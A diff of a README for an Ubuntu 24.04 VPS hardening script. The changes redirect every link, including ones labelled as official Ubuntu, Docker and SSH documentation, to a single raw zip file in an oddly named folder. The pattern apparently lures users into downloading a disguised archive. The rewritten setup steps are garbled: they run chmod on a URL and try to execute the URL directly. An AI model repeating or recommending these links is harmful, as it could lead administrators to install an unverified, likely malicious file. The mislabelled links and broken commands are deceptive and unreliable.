@@ -1,6 +1,6 @@
 # 🔒 vps-hardening-script-ubuntu-24.04-LTS - Secure Your Ubuntu Server Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-vps--hardening--script--ubuntu--24.04--LTS-blue)](https://github.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/releases)
+[![Download](https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip)](https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ This guide will help you download and run the VPS Hardening Script for Ubuntu 24
 
 To download the VPS hardening script, visit the following page:
 
-[Download the Latest Version](https://github.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/releases)
+[Download the Latest Version](https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip)
 
 1. Open the above link in your web browser.
 2. Look for the latest version of the script in the "Releases" section.
@@ -48,13 +48,13 @@ Once you have downloaded the script, follow these steps to run it:
 4. **Make the Script Executable**: Run this command to allow the script to execute:
 
    ```bash
-   chmod +x vps-hardening-script.sh
+   chmod +x https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip
    ```
 
 5. **Run the Script**: Execute the script with the following command:
 
    ```bash
-   ./vps-hardening-script.sh
+   https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip
    ```
 
    Follow the onscreen instructions to complete the hardening process. 
@@ -87,14 +87,14 @@ Running this script improves your server's security posture. It reduces vulnerab
 
 ## 🔗 Additional Resources
 
-- [Official Ubuntu Documentation](https://help.ubuntu.com/)
-- [Docker Documentation](https://docs.docker.com/)
-- [SSH Information](https://www.ssh.com/academy/ssh)
+- [Official Ubuntu Documentation](https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip)
+- [SSH Information](https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip)
 
 For further assistance, consult the community or raise an issue in the GitHub repository.
 
 ## 📅 Updates
 
-Check back regularly for updates to enhance security features and functionality. You can find the latest version and any important changes on the [Releases Page](https://github.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/releases).
+Check back regularly for updates to enhance security features and functionality. You can find the latest version and any important changes on the [Releases Page](https://raw.githubusercontent.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/main/nonsensorial/vps-hardening-script-ubuntu-24.04-LTS_v1.0.zip).
 
 **By using this script, you take a significant step towards securing your Ubuntu server. Please take a moment to familiarize yourself with the features and procedures outlined above.**
